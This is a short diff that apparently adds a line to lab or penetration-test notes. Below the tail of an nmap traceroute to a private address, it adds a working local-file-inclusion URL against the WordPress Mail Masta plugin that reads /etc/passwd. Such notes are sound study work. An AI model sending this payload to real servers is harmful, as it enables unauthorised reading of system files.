@@ -96,3 +96,6 @@ TRACEROUTE (using port 995/tcp)
 HOP RTT       ADDRESS
 1   454.33 ms 192.168.49.1
 2   454.36 ms 192.168.102.112
+
+LFI in mail masta plugin
+http://192.168.102.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
